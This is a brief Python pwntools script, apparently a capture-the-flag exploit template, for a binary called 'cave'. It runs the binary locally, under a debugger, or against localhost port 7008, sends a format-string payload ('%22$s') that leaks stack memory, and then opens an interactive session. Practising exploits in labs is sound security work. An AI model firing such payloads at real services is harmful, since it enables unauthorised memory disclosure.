#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("cave")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7008)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()

    r.sendline(b"%22$s")
    
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

